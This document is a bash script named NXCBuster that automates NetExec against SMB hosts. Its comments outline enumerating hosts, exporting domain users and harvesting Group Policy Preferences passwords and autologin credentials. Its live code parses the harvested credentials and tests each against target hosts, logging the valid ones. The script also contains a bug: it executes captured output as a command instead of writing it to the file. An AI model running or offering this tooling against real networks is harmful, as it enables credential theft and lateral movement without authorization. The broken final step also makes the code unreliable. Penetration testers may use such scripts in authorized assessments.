#!/bin/bash

OUTDIR="./nxcbuster_output"
PASSW=""
USER=""
TARGETS_FILE=""

# NXCBuster - A script to run NetExec automated
# Parameters:
# -t <targets_file>: File containing list of target IPs/hostnames/cidrs
# -u <username>: Username for authentication
# -p <password>: Password for authentication
# --proto <protocol>: Protocol to execute commands, all is default and runs all
# -o <output_dir>: Directory to save output files






while getopts "t:u:p:-:o:" opt; do
  case $opt in
    t) TARGETS_FILE="$OPTARG" ;;
    u) USER="$OPTARG" ;;
    p) PASSW="$OPTARG" ;;
    o) OUTDIR="$OPTARG" ;;
    -)
      case $OPTARG in
        proto=*) PROTO="${OPTARG#*=}" ;;
        *)
          echo "Invalid option: --$OPTARG" >&2
          exit 1
          ;;
      esac
      ;;
    *)
      echo "Invalid option: -$opt" >&2
      exit 1
      ;;
  esac
done






# smb
# step 1 get all hosts with smb open
# nxc smb <targets_file> --generate-hosts-file <output_dir>/all_smb_hosts.txt
# step 2.1 extract ips from hosts file
# awk '{print $1}' <output_dir>/all_smb_hosts.txt > <output_dir>/all_smb_ips.txt
# step 2.2 collect all usersnames from smb hosts
# nxc smb <output_dir>/all_smb_ips.txt -u <username> -p <password> --users-export <output_dir>/smb_users.txt
# 3 search for credentials by group policy
# nxc smb <output_dir>/all_smb_ips.txt -u <username> -p <password> -M gpp_passwords > <output_dir>/smb_gpp_passwords.txt
# 4.1 search for credentials by gpp autologin scripts
# nxc smb <output_dir>/all_smb_ips.txt -u <username> -p <password> -M gpp_autologin 2>&1 | grep -a "GPP_AUTO..." > <output_dir>/smb_gpp_autologin.txt
# extract credentials from gpp autologin
file="$OUTDIR/smb_gpp_autologin.txt"
grep -a -n "Found credentials" "$file" | cut -d: -f1 | while read -r ln; do
  ip=$(sed -n "${ln}p" "$file" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}')
  block=$(sed -n "$((ln+1)),$((ln+6))p" "$file")
  user=$(echo "$block" | grep -m1 'Usernames:' | sed -E "s/.*Usernames:\s*\[(.*)\].*/\1/" | tr -d \"\' | cut -d, -f1)
  pass=$(echo "$block" | grep -m1 'Passwords:' | sed -E "s/.*Passwords:\s*\[(.*)\].*/\1/" | tr -d \"\' | cut -d, -f1)
  user="${user%@*}"
  if [[ -n "$ip" && -n "$user" && -n "$pass" ]]; then
    RESULTS=$(nxc smb "$ip" -u "$user" -p "$pass" | grep "[+]")
    $RESULTS >> "$OUTDIR/smb_valid_creds.txt"
  fi
done



